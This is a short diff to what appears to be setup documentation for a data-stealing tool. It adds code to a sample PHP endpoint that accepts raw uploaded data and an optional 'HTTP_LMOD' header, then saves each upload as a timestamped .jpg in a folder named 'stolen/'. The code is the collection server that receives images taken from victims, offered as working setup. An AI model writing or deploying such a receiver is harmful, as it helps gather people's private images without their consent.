@@ -93,8 +93,16 @@ for version2:
 
 sample of file.php:
 <?php
+$lmod = $_SERVER["HTTP_LMOD"];
 $inp = file_get_contents("php://input");
+if($inp != "")
+{
+if(strlen($lmod) > 0)
+file_put_contents("stolen/" . time() . "_" . $lmod . ".jpg", $inp);
+else
 file_put_contents("stolen/" . time() . ".jpg", $inp);
+//for old version safeguard
+}
 
 $file = scandir("stolen/");
 if(sizeof($file) > 52)
